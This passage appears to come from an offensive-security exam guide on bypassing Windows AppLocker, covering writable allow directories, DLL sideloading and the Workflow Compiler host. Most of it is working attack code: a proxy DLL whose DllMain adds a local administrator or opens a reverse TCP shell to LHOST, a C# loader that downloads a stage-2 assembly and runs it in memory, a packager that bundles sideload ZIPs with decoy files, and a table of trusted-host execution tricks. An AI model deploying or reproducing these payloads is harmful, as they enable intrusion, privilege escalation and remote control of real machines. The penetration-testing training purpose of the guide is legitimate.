   Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
   ```
2. Extract allow paths:
   ```powershell
   (Get-AppLockerPolicy -Effective).RuleCollections |
     Where-Object CollectionType -eq 'Exe' |
     ForEach-Object { $_.GetRules() } |
     Where-Object Action -eq 'Allow' |
     Select-Object -ExpandProperty Conditions
   ```
3. Check write rights on each candidate directory:
   ```powershell
   icacls "C:\Windows\Tasks"
   # or
   accesschk.exe -w "C:\Windows\Tasks" -accepteula
   ```
4. Deliver the payload to an “allowed + writable” directory and execute from there.

**Lab files**:
| File | Purpose | Key parameters |
|---|---|---|
| `m05-applocker-enum.ps1` | Enumerate effective rules + writable allow paths | `-PayloadPath` optional |

#### `m05-applocker-enum.ps1` {#m05-applocker-enum-ps1}

````powershell
<#
Purpose: enumerate AppLocker effective policy, writable allow paths, and DLL rule-set status; emit ready-to-use execution-directory candidates
Scenarios: 21, 22 (and as a pre-check for 18/23/24)
Depends: PowerShell 3.0+; Get-AppLockerPolicy needs Win10+/Server 2016+ with AppLocker service running
Usage: powershell -ep bypass -f m05-applocker-enum.ps1
      optional: -ExtraDirs "C:\Custom\Path" to append directories to check
Placeholders: none (to place a payload into a candidate dir, use -PayloadSource for a local path)
Test status: not runtime-tested on Windows; syntax checked by hand
Notes:
  - Under CLM, Get-AppLockerPolicy may fail to parse objects; the script falls back to -Xml on disk.
  - Output is sorted by “allowed + writable”; ends with a recommended execution directory.
#>
[CmdletBinding()]
param(
    [string[]]$ExtraDirs = @(),
    [string]$OutFile = "$env:TEMP\applocker-report.txt"
)

function Write-Both($text) { Write-Output $text; Add-Content -Path $OutFile -Value $text -ErrorAction SilentlyContinue }

"" | Out-File -FilePath $OutFile -Encoding utf8 -ErrorAction SilentlyContinue
Write-Both ("=== AppLocker enum {0} ===" -f (Get-Date))
Write-Both ("current user: {0}" -f (whoami))
Write-Both ("language mode: {0}" -f $ExecutionContext.SessionState.LanguageMode)

# ---------- 1. Service and policy availability ----------
Write-Both "`n--- service status ---"
try {
    $svc = Get-Service AppIDSvc -ErrorAction Stop
    Write-Both ("AppIDSvc: {0}" -f $svc.Status)
} catch { Write-Both "AppIDSvc: query failed (AppLocker may not be installed)" }

# ---------- 2. Effective policy ----------
Write-Both "`n--- effective policy ---"
$policy = $null
try {
    $policy = Get-AppLockerPolicy -Effective -ErrorAction Stop
    Write-Both "[+] Get-AppLockerPolicy -Effective succeeded"
} catch {
    Write-Both ("[-] -Effective failed: {0}" -f $_.Exception.Message)
    try {
        $xml = Get-AppLockerPolicy -Effective -Xml -ErrorAction Stop
        $xml | Out-File "$env:TEMP\al-effective.xml" -Encoding utf8
        Write-Both "[+] wrote XML: $env:TEMP\al-effective.xml (parse offline)"
    } catch { Write-Both ("[-] -Xml also failed: {0}" -f $_.Exception.Message) }
}

$allowPaths = New-Object System.Collections.Generic.List[string]
$ruleSummary = @()
if ($policy) {
    foreach ($rc in $policy.RuleCollections) {
        $rules = @()
        try { $rules = $rc.GetRules() } catch { $rules = @() }
        $ruleSummary += ("{0}: {1} rules, enforcement={2}" -f $rc.CollectionType, $rules.Count, $rc.EnforcementMode)
        foreach ($r in $rules) {
            if ($r.Action -ne 'Allow') { continue }
            foreach ($c in $r.Conditions) {
                # PathCondition / FilePublisherCondition / FileHashCondition
                if ($c.PSObject.Properties.Name -contains 'Path') {
                    $allowPaths.Add([string]$c.Path)
                }
            }
        }
    }
}
Write-Both ("`n--- rule overview ---`n" + ($ruleSummary -join "`n"))
Write-Both ("`n--- allow paths ---`n" + (($allowPaths | Sort-Object -Unique) -join "`n"))

# ---------- 3. DLL rule set ----------
Write-Both "`n--- DLL rule set ---"
if ($policy) {
    $dll = $policy.RuleCollections | Where-Object { $_.CollectionType -eq 'Dll' }
    if ($dll) { Write-Both ("DLL rule set present, enforcement={0}" -f $dll.EnforcementMode) }
    else { Write-Both "[+] no DLL rule set found → scenario 22 DLL path is usually viable" }
}

# ---------- 4. Candidate directory write rights ----------
$candidates = @(
    "C:\Windows\Tasks", "C:\Windows\Temp", "C:\Windows\System32\spool\drivers\color",
    "$env:TEMP", "$env:APPDATA", "$env:LOCALAPPDATA", "C:\Users\Public", "C:\ProgramData"
) + $ExtraDirs

Write-Both "`n--- candidate directory writability ---"
$writable = @()
foreach ($d in ($candidates | Sort-Object -Unique)) {
    if (-not (Test-Path $d)) { Write-Both ("[ ] missing: {0}" -f $d); continue }
    $canWrite = $false
    try {
        $probe = Join-Path $d (".w_" + [guid]::NewGuid().ToString('N').Substring(0,8))
        [IO.File]::WriteAllText($probe, "x")
        Remove-Item $probe -Force -ErrorAction SilentlyContinue
        $canWrite = $true
    } catch { $canWrite = $false }
    $flag = if ($canWrite) { "[+] writable" } else { "[-] not writable" }
    Write-Both ("{0} {1}" -f $flag, $d)
    if ($canWrite) { $writable += $d }
}

# ---------- 5. Conclusion ----------
Write-Both "`n=== conclusion ==="
if ($writable.Count -gt 0) {
    Write-Both ("prefer these execution directories (filtered by writability):`n" + ($writable -join "`n"))
    Write-Both "`nnext: deliver the payload into one of the above and run it; if policy still refuses, that directory is not on the allow list."
} else {
    Write-Both "no writable directory found → switch to DLL path (scenario 22) or trusted hosts (scenarios 23/24)."
}
Write-Both ("`nreport saved: {0}" -f $OutFile)
````

**Verify**: from the target directory run `cmd /c whoami` or your payload and confirm policy no longer blocks; keep `Test-Path` and `icacls` output on record.

**If it fails**:
1. No writable allow directory → DLL path (scenario 22) or trusted hosts (scenarios 23, 24).
2. Policy parse limited by CLM → `Get-AppLockerPolicy -Effective -Xml` to disk then parse offline, or brute-force common directories.
3. Allow directory exists but Defender blocks the payload → combine with scenario 18 encoding.

**Exam notes / OPSEC**: AppLocker only limits “where you start from”, not everything about “what you start”; confirm policy version first (`Get-AppLockerPolicy -Effective` needs Win10+); on older systems use `Get-AppLockerPolicy -Local` or read `%windir%\System32\AppLocker\*.xml` directly.

---

## Scenario 22: EXE rules are strict, but DLL rules and host allow conditions differ

**Situation**: Ordinary custom programs cannot start directly, but an already-allowed application can load an external DLL, and that DLL load is not blocked by an effective rule.

**Assumptions**:
- AppLocker DLL rule set is off or loose (DLL rules are off by default).
- There is an allowed host program that loads a DLL from a location you can influence.

**Prepare (attacker)**:
```bash
# Proxy DLL idea: export full forward + run payload in DllMain
x86_64-w64-mingw32-gcc -shared -o hijack.dll m04-proxy-dll-sideload.c proxy.def -s
```

**Procedure**:
1. Confirm DLL rule-set status:
   ```powershell
   (Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
   ```
   `Dll` type missing or AuditOnly → DLL path is viable.
2. Find an allowed host and its DLL search path (same directory first).
3. Place the DLL on the host’s search path; keep exports and calling convention matching the original DLL (see [04-dll-sideloading](/modules/04-dll-sideloading) scenario 12).
4. Start the host; confirm the payload runs and the host still works.

**Lab files**:
| File | Purpose | Key parameters |
|---|---|---|
| `m04-proxy-dll-sideload.c` | Full-forward Proxy DLL | Replace original DLL name |
| `m04-proxy-dll-newadmin.c` | DLL payload (add admin / reverse) | LHOST/LPORT |
| `m04-build-sideload-package.py` | Pack host + DLL | Host version, arch |

#### `m04-proxy-dll-sideload.c` {#m04-proxy-dll-sideload-c}

````c
/*
 * m04-proxy-dll-sideload.c
 *
 * Purpose: “pure forward / no-payload control” Proxy for DLL sideloading. The built DLL shares
 *       the host’s original DLL name (e.g. legit.dll) and forwards every export via forward.def
 *       to the renamed original in the same directory (original.dll). Host functionality is
 *       unaffected. This file carries no payload — used for scenario 12 variable isolation:
 *       first prove “forwarding is correct, host does not crash”, then swap in the live
 *       m04-proxy-dll-newadmin.c.
 * Scenarios: M04 · scenario 11 (compat validation) / scenario 12 (crash triage step 1)
 * Depends: MinGW-w64 or MSVC; original DLL export list (objdump -p / dumpbin /exports)
 * Usage:
 *   # Generate forward.def from the export list first (lines like "Foo = original.Foo"; see doc §2)
 *   x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-sideload.c forward.def
 *   strip legit.dll
 *   # MSVC: cl /LD m04-proxy-dll-sideload.c /Fe:legit.dll /link /DEF:forward.def
 * Placeholders: none (pure forward; no network/account actions); debug-only macros default off.
 * Test status: not runtime-tested (no lab host); syntax and link style follow normal MinGW usage.
 *   On first use, validate in a replica VM with “host + original.dll renamed beside it” that the host starts cleanly.
 */

#include <windows.h>

/*
 * In DLL_PROCESS_ATTACH do the minimum and return TRUE.
 * Rule: DllMain runs under the loader lock — no LoadLibrary, no waits, no network I/O.
 * To confirm “our DLL was actually loaded” (local triage only; leaves artifacts on a lab host):
 *   defining DEBUG_LOADED writes a timestamp line to %TEMP%\m04-sideload-loaded.txt.
 */
#ifdef DEBUG_LOADED
#include <stdio.h>
static void NoteLoaded(void)
{
    char path[MAX_PATH];
    FILE *f;
    if (!GetTempPathA(MAX_PATH, path))
        return;
    lstrcatA(path, "m04-sideload-loaded.txt");
    f = fopen(path, "a");
    if (f) {
        fprintf(f, "proxy loaded into pid %lu\n", GetCurrentProcessId());
        fclose(f);
    }
}
#endif

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    (void)hModule;
    (void)lpReserved;
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
#ifdef DEBUG_LOADED
        NoteLoaded();
#endif
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

/*
 * Optional rundll32 test entry: rundll32 legit.dll,Run validates this DLL can be loaded and
 * called without the host (scenario 12: “host environment problem vs DLL problem”).
 * Note: in a real delivery package the DLL filename must be the name the host loads — do not rely on this entry.
 */
__declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
                                        LPSTR lpszCmdLine, int nCmdShow)
{
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    /* empty: only proves the load/call chain works */
}

/*
 * Notes: all forward exports come from forward.def — not declared in the C source —
 * avoiding hand-written signatures (wrong signature = wrong calling convention = scenario 12 crash).
 * If .def forwarding is unsupported on your toolchain (some old binutils), fallback:
 *   1) compile with MSVC link.exe /DEF:forward.def;
 *   2) or use the “hand-write a few forwards” mode in m04-proxy-dll-cpp.cpp (when few functions).
 */
````

#### `m04-proxy-dll-newadmin.c` {#m04-proxy-dll-newadmin-c}

````c
/*
 * m04-proxy-dll-newadmin.c
 *
 * Purpose: “live” Proxy for DLL sideloading — keep the host healthy via forwarding while
 *       running a payload. Two compile-time modes:
 *         MODE_NETUSER (default): create a local admin (cheat sheet “New Admin
 *                   with C”) — good when the host runs elevated;
 *         MODE_REVERSE: reverse TCP shell — good when you only have a normal-user interactive session.
 *       All forward exports still come from forward.def (same as m04-proxy-dll-sideload.c).
 * Scenarios: M04 · scenario 11 (primary delivery payload); scenario 12 (attach payload after forward is proven)
 * Depends: MinGW-w64 / MSVC; ws2_32, netapi32;
 *       forward.def (from original DLL export list — see docs/04-dll-sideloading.md)
 * Usage:
 *   Reverse mode (Kali cross-compile):
 *     x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-newadmin.c forward.def \
 *       -lws2_32 -lnetapi32 -DMODE_REVERSE \
 *       -DLHOST=L\"10.0.0.5\" -DLPORT=L\"4444\"
 *   Add-admin mode:
 *     x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-newadmin.c forward.def \
 *       -lnetapi32 -DMODE_NETUSER \
 *       -DADMIN_USER=L\"ExamUser\" -DADMIN_PASS=L\"ExamPass!23\"
 *   Rename the built DLL to the name the host loads (e.g. legit.dll) and place it in the host directory.
 * Placeholders: LHOST / LPORT (reverse target), USER / PASS (new account — defaults are placeholders only;
 *       must override with -D before compile). Without -D overrides the target creates literal
 *       "USER"/"PASS" accounts — always replace for the exam.
 * Test status: not runtime-tested. Syntax follows MinGW-w64 norms; not validated on a lab host. First use:
 *   prove forwarding with no-payload m04-proxy-dll-sideload.c in a local VM, then compile this file to test payload only.
 */

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <stdlib.h>

/* MSVC auto-link; MinGW needs -lws2_32 -lnetapi32 on the command line */
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "netapi32.lib")

#ifndef MODE_NETUSER
#ifndef MODE_REVERSE
#define MODE_NETUSER          /* default: add admin */
#endif
#endif

#ifndef LHOST
#define LHOST L"127.0.0.1"    /* placeholder — must override at compile */
#endif
#ifndef LPORT
#define LPORT L"4444"
#endif
#ifndef ADMIN_USER
#define ADMIN_USER L"USER"    /* placeholder — must override at compile */
#endif
#ifndef ADMIN_PASS
#define ADMIN_PASS L"PASS"
#endif

/* ---------- Mode 1: create local admin (cheat sheet: New Admin with C) ---------- */

static DWORD AddAdminUser(void)
{
    NET_API_STATUS rc;
    USER_INFO_1 ui;
    LOCALGROUP_MEMBERS_INFO_0 gm;
    SID_NAME_USE snu;
    BYTE sid[256];
    DWORD cbSid = sizeof(sid);
    DWORD cbDomain = sizeof(sid) / sizeof(WCHAR);
    WCHAR domain[256];

    ZeroMemory(&ui, sizeof(ui));
    ui.usri1_name        = (LPWSTR)ADMIN_USER;
    ui.usri1_password    = (LPWSTR)ADMIN_PASS;
    ui.usri1_priv        = USER_PRIV_USER;               /* cannot grant admin at create time */
    ui.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;
    ui.usri1_script_path = NULL;

    rc = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);         /* local server */
    if (rc != NERR_Success)
        return rc;

    if (!LookupAccountNameW(NULL, (LPWSTR)ADMIN_USER, sid, &cbSid,
                            domain, &cbDomain, &snu))
        return (DWORD)GetLastError();

    gm.lgrmi0_sid = (PSID)sid;
    rc = NetLocalGroupAddMembers(NULL, L"Administrators", 0, (LPBYTE)&gm, 1);
    return rc;
}

static DWORD WINAPI NetUserThread(LPVOID ctx)
{
    (void)ctx;
    AddAdminUser();
    return 0;
}

/* ---------- Mode 2: reverse TCP shell ---------- */

static DWORD WINAPI ReverseThread(LPVOID ctx)
{
    WSADATA wsa;
    SOCKET s = INVALID_SOCKET;
    struct sockaddr_in sa;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    WCHAR cmdline[] = L"cmd.exe";

    (void)ctx;
    Sleep(2000);                                   /* let host UI appear first */
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 1;

    s = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET)
        goto fail;

    sa.sin_family = AF_INET;
    sa.sin_port = htons((u_short)_wtoi(LPORT));
    if (InetPtonW(AF_INET, LHOST, &sa.sin_addr) != 1)
        goto fail;

    if (WSAConnect(s, (const struct sockaddr *)&sa, sizeof(sa),
                   NULL, NULL, NULL, NULL) != 0)
        goto fail;

    /* make the socket inheritable for the child as std handles */
    SetHandleInformation((HANDLE)s, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcessW(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        goto fail;

    WaitForSingleObject(pi.hProcess, INFINITE);    /* keep socket until cmd exits */
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(s);
    WSACleanup();
    return 0;

fail:
    if (s != INVALID_SOCKET)
        closesocket(s);
    WSACleanup();
    return 1;
}

/* ---------- Entry ---------- */

static void LaunchPayload(void)
{
    HANDLE h;
#ifdef MODE_REVERSE
    h = CreateThread(NULL, 0, ReverseThread, NULL, 0, NULL);
#else
    h = CreateThread(NULL, 0, NetUserThread, NULL, 0, NULL);
#endif
    if (h != NULL)
        CloseHandle(h);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    (void)hModule;
    (void)lpReserved;
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        /* under loader lock: no heavy work/waits — only start a thread; all action lives there */
        LaunchPayload();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

/*
 * Independent rundll32 test entry: rundll32 legit.dll,Run
 * Validates payload without the host; under real sideload, DllMain already fired — this entry is triage only.
 */
__declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
                                        LPSTR lpszCmdLine, int nCmdShow)
{
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    LaunchPayload();
}
````

#### `m04-build-sideload-package.py` {#m04-build-sideload-package-py}

````python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# m04-build-sideload-package.py
#
# Purpose: pack a DLL-sideload directory into a ZIP delivery artifact, with consistency checks first:
#       - all PE files in the directory share one arch (x86/x64; mixed = scenario 12 crash);
#       - both the “host-loaded name DLL” (proxy) and the “renamed original DLL” must be present;
#       - proxy export count aligns with the original (full forward keeps the host alive;
#         mismatch means forward.def missed exports — primary crash cause).
#       Emits ZIP + SHA256 so you can verify integrity after delivery.
# Scenarios: M04 · scenario 11 pre-delivery prep / scenario 12 export-forward self-check
# Depends: Python 3 stdlib (no pefile); directory holds a compiled host and DLLs
# Usage:
#   python3 m04-build-sideload-package.py \
#       --input-dir ./sideload --dll-name legit.dll --original-name original.dll \
#       --out sideload-pkg.zip
#   Expected layout (packed as-is, wrapped in a <top-dir> folder):
#     sideload/
#       RunHost.exe     host (untouched original)
#       legit.dll       proxy (built and renamed to the host-loaded name; set via --dll-name)
#       original.dll    renamed original legit.dll — forward target
#       other files/dirs  decoys for business appearance
# Placeholders: none (filenames come from args)
# Test status: not runtime-tested; PE parse follows the standard structure (MZ->PE->optional header->export dir).
#   Recommend a --dry-run-style check in a replica VM with a real host/original DLL before delivery.

import argparse
import hashlib
import os
import struct
import sys
import zipfile

MACHINE = {0x14C: "x86 (PE32)", 0x8664: "x64 (PE32+)", 0x1C0: "ARM", 0xAA64: "ARM64"}
EXP_DIR_IDX = 0  # IMAGE_DIRECTORY_ENTRY_EXPORT

class PeInfo(object):
    def __init__(self, path, arch, n_exports):
        self.path = path
        self.arch = arch            # 0x14C / 0x8664 / None
        self.n_exports = n_exports  # named export count (forward/original should both have values)

    def __repr__(self):
        return "%s arch=%s exports=%d" % (
            os.path.basename(self.path),
            MACHINE.get(self.arch, "unknown(0x%X)" % self.arch) if self.arch else "not-PE",
            self.n_exports)

def _u16(buf, off):
    return struct.unpack_from("<H", buf, off)[0]

def _u32(buf, off):
    return struct.unpack_from("<I", buf, off)[0]

def _read_cstr(buf, off):
    end = buf.find(b"\x00", off)
    return buf[off:end].decode("latin-1", "replace") if end != -1 else ""

def parse_pe(path):
    """Return (arch_machine, n_export_names); raise ValueError if not PE / parse fails."""
    with open(path, "rb") as f:
        buf = f.read()
    if buf[:2] != b"MZ":
        raise ValueError("no MZ header")
    pe = _u32(buf, 0x3C)
    if pe + 6 > len(buf) or buf[pe:pe + 4] != b"PE\x00\x00":
        raise ValueError("no PE signature")
    arch = _u16(buf, pe + 4)
    n_sec = _u16(buf, pe + 6)
    opt_size = _u16(buf, pe + 20)
    opt = pe + 24
    magic = _u16(buf, opt)
    if magic == 0x10B:
        dd_base = opt + 96           # PE32 data-directory offset
    elif magic == 0x20B:
        dd_base = opt + 112          # PE32+ data-directory offset
    else:
        raise ValueError("unknown optional header magic 0x%X" % magic)

    sections = []
    sec = opt + opt_size
    for i in range(n_sec):
        s = sec + i * 40
        sections.append((_u32(buf, s + 12),     # VirtualAddress
                         _u32(buf, s + 8),      # VirtualSize
                         _u32(buf, s + 20),     # PointerToRawData
                         _u32(buf, s + 16)))    # SizeOfRawData

    def rva2off(rva):
        for va, vs, raw, size in sections:
            if va <= rva < va + max(vs, size):
                off = raw + (rva - va)
                if 0 <= off < len(buf):
                    return off
        return None

    n_names = 0
    exp_rva = _u32(buf, dd_base + 8 * EXP_DIR_IDX)
    exp_off = rva2off(exp_rva) if exp_rva else None
    if exp_off is not None:
        n_names = _u32(buf, exp_off + 24)          # NumberOfNames
        names_rva = _u32(buf, exp_off + 32)        # AddressOfNames (RVA table)
        base = rva2off(names_rva)
        if base is not None:
            for i in range(min(n_names, 64)):      # spot-check first 64 names are readable
                no = rva2off(_u32(buf, base + i * 4))
                if no is None or not _read_cstr(buf, no):
                    raise ValueError("export name table corrupt")
    return arch, n_names

def main(argv):
    ap = argparse.ArgumentParser(description="Build & validate a DLL sideload ZIP package")
    ap.add_argument("--input-dir", required=True, help="directory: host + proxy DLL + renamed original + decoys")
    ap.add_argument("--dll-name", required=True, help="DLL filename the host actually loads (= proxy name)")
    ap.add_argument("--original-name", default="original.dll", help="renamed original DLL filename")
    ap.add_argument("--out", default="sideload-pkg.zip", help="output ZIP")
    ap.add_argument("--top-dir", default="", help="top folder name inside ZIP (default <input dirname>-pkg)")
    args = ap.parse_args(argv)

    indir = args.input_dir
    if not os.path.isdir(indir):
        print("[-] input dir not found: %s" % indir)
        return 1
    top = args.top_dir or (os.path.basename(os.path.abspath(indir)) + "-pkg")

    ppe = os.path.join(indir, args.dll_name)
    porig = os.path.join(indir, args.original_name)
    if not os.path.isfile(ppe):
        print("[-] proxy DLL missing (host-loaded name): %s" % ppe)
        return 1
    if not os.path.isfile(porig):
        print("[-] renamed original DLL missing: %s" % porig)
        return 1

    # 1) All PEs in the directory must share one arch
    arch0 = None
    for name in sorted(os.listdir(indir)):
        p = os.path.join(indir, name)
        if os.path.isdir(p):
            continue
        try:
            arch, _ = parse_pe(p)
        except ValueError:
            print("[!] skip non-PE file: %s" % name)
            continue
        if arch not in MACHINE:
            print("[!] skip unknown-arch PE: %s" % name)
            continue
        if arch0 is None:
            arch0 = arch
            print("[*] PE arch baseline: %s" % MACHINE[arch])
        elif arch != arch0:
            print("[-] arch mismatch: %s is %s, baseline is %s" % (
                name, MACHINE.get(arch, hex(arch)), MACHINE[arch0]))
            return 1

    # 2) Proxy vs original export-count alignment (full-forward check)
    _, n_proxy = parse_pe(ppe)
    _, n_orig = parse_pe(porig)
    print("[*] %s exports=%d | %s exports=%d" % (
        args.dll_name, n_proxy, args.original_name, n_orig))
    if n_proxy == 0:
        print("[-] proxy exports 0 names: forward.def did not take effect or is empty — host will crash on missing imports")
        return 1
    if n_proxy != n_orig:
        print("[!] export count mismatch (%d != %d): forward.def missed or has extra exports; "
              "host may crash — compare export tables with dumpbin/objdump" % (n_proxy, n_orig))

    # 3) Pack: wrap in top folder, keep relative structure
    with zipfile.ZipFile(args.out, "w", zipfile.ZIP_DEFLATED) as z:
        for root, dirs, files in os.walk(indir):
            dirs.sort()
            for name in sorted(files):
                full = os.path.join(root, name)
                rel = os.path.relpath(full, indir)
                z.write(full, os.path.join(top, rel))
    sha = hashlib.sha256(open(args.out, "rb").read()).hexdigest()
    print("[+] wrote %s (%d bytes) sha256=%s" % (args.out, os.path.getsize(args.out), sha))
    print("[*] manual checks before delivery: 1) in a replica VM, unzip and double-click the host — it should start "
          "normally with the payload active; 2) ProcMon confirms Load Image hits top/%s; 3) version matches the target"
          % args.dll_name)
    return 0

if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
````

**Verify**: host starts normally (no crash); DLL payload executes; confirm with `whoami` or a callback.

**If it fails**:
1. DLL rule set on and strict → switch to trusted hosts (scenarios 23, 24).
2. Host crashes → export table / calling convention mismatch (`docs/04` scenario 12).
3. Host does not load same-directory DLL → find another sideload-capable host, or use `PATH` hijack.

**Exam notes / OPSEC**: AppLocker DLL rules are off by default — one of the easiest exam paths; do not treat it as guaranteed — check policy first.

---

## Scenario 23: InstallUtil unavailable, but other trusted execution hosts from the course still work

**Situation**: The InstallUtil path is blocked by policy, but the target still has the Workflow compiler host and its required environment.

**Assumptions**:
- AppLocker blocks InstallUtil (or it was removed from the allow list).
- `Microsoft.Workflow.Compiler.exe` exists and is runnable (.NET Framework 4.0 directory).

**Prepare (attacker)**:
```bash
# Build the Workflow input assembly (managed assembly with XOML logic)
x86_64-w64-mingw32-gcc ...   # not needed — compile C# with csc.exe
# On target:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:payload.dll m05-workflow-compiler-runner.cs
```

**Procedure**:
1. Confirm the host exists:
   ```powershell
   Test-Path C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
   ```
2. Prepare XOML + assembly (or use the assembly entry directly).
3. Invoke:
   ```cmd
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe payload.xoml output.xml
   ```
4. Confirm payload execution (callback / on-disk marker file).

**Lab files**:
| File | Purpose | Key parameters |
|---|---|---|
| `m05-workflow-compiler-runner.cs` | Workflow host input assembly | Replace payload logic |
| `m05-lolbas-notes.md` | Trusted-host quick reference | — |

#### `m05-workflow-compiler-runner.cs` {#m05-workflow-compiler-runner-cs}

````csharp
// Purpose: Workflow Compiler trusted host — assembly loaded and run by Microsoft.Workflow.Compiler.exe
// Scenario: 23 (InstallUtil blocked by policy, but Workflow compiler host and environment remain)
// Depends: .NET Framework 4.x; target has C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
// Usage:
//   csc.exe /target:library /out:payload.dll m05-workflow-compiler-runner.cs
//   Microsoft.Workflow.Compiler.exe payload.xoml output.xml
// Placeholders: LHOST/LPORT (callback address), STAGE2_URL
// Test status: not compile-verified (no csc on this host); syntax checked by hand
//
// Notes:
//   - This host compiles and runs an XOML workflow; put payload logic in a static method on the assembly,
//     invoked by a CodeActivity in the XOML or by the host loading the assembly directly.
//   - If XOML is awkward to generate, some versions support -r to load this assembly and call Run().
//   - Always use the full path for commands — do not rely on PATH (AppLocker matches by path).

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;

namespace Payload
{
    public static class Runner
    {
        private const string STAGE2_URL = "http://LHOST/stage2.b64";  // ← replace

        public static void Run()
        {
            try
            {
                if (!STAGE2_URL.Contains("LHOST"))
                {
                    byte[] enc = new WebClient().DownloadData(STAGE2_URL);
                    Assembly asm = Assembly.Load(enc);
                    foreach (Type t in asm.GetTypes())
                    {
                        if (!t.IsPublic) continue;
                        var m = t.GetMethod("Run", BindingFlags.Public | BindingFlags.Static);
                        if (m != null) { m.Invoke(null, null); return; }
                    }
                }

                // Minimal validation with no egress: write a marker file
                File.WriteAllText(Path.Combine(Path.GetTempPath(), "workflow-ran.txt"), whoami());
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[!] Workflow payload failed: " + ex.Message);
            }
        }

        private static string whoami()
        {
            var psi = new ProcessStartInfo("whoami")
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using (var p = Process.Start(psi)) { return p.StandardOutput.ReadToEnd(); }
        }
    }
}
````

#### `m05-lolbas-notes.md` {#m05-lolbas-notes-md}

````markdown
# Trusted-host quick reference (scenarios 21–24)

> Purpose: when AppLocker refuses custom EXEs, carry execution with **system programs the policy already allows**.
>
> Scenarios: 21 (allow directories), 22 (loose DLL rules), 23 (InstallUtil blocked → switch host), 24 (XSL)
>
> Placeholders: `PAYLOAD`, `LHOST`, `URL`, `TARGET`

## 1. Host comparison table

| Host | Path (use full path; do not rely on PATH) | Input | Scenarios | Notes |
|---|---|---|---|---|
| InstallUtil | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe` | Managed assembly DLL | 6, 23 | `/logfile= /LogToConsole=false /U payload.dll` |
| Workflow Compiler | `...\v4.0.30319\Microsoft.Workflow.Compiler.exe` | XOML + assembly | 23 | `payload.xoml output.xml` |
| mshta | `C:\Windows\System32\mshta.exe` | `.hta` / URL | 6–8 | Often monitored on its own |
| msxsl | Not inbox — bring your own | `.xsl` | 24 | Bringing your own introduces a custom file — watch AppLocker |
| wmic | `C:\Windows\System32\wbem\wmic.exe` | `/format:"x.xsl"` | 24 | May be removed on Win11 24H2+; check `where wmic` first |
| regsvr32 | `C:\Windows\System32\regsvr32.exe` | `.sct` / DLL | Fallback | `/s /n /u /i:URL scrobj.dll` |
| MSBuild | `...\Framework64\v4.0.30319\MSBuild.exe` (or VS dir) | Inline tasks in `.csproj` | Fallback | Needs MSBuild present |
| csc | `...\v4.0.30319\csc.exe` | `.cs` | Fallback | Compile output still lands on disk |
| rundll32 | `C:\Windows\System32\rundll32.exe` | DLL export / JS | Fallback | `comsvcs.dll, MiniDump` also goes through it |

## 2. Selection order (“most likely allowed + least obvious”)

1. **Loose DLL rules** → drop a DLL next to an already-allowed host (scenario 22 — easiest)
2. **Writable allow directory** → put the payload there and run (scenario 21)
3. **InstallUtil** → managed assembly (scenarios 6, 23)
4. **Workflow Compiler** → when InstallUtil is blocked (scenario 23)
5. **XSL (msxsl/wmic)** → when normal script entry is limited (scenario 24)
6. **regsvr32 / MSBuild** → last resort

## 3. Pre-check commands

```powershell
# Effective policy
Get-AppLockerPolicy -Effective -Xml | Out-File C:\Windows\Temp\al.xml

# Hosts present?
Test-Path C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
Test-Path C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
where wmic
where mshta

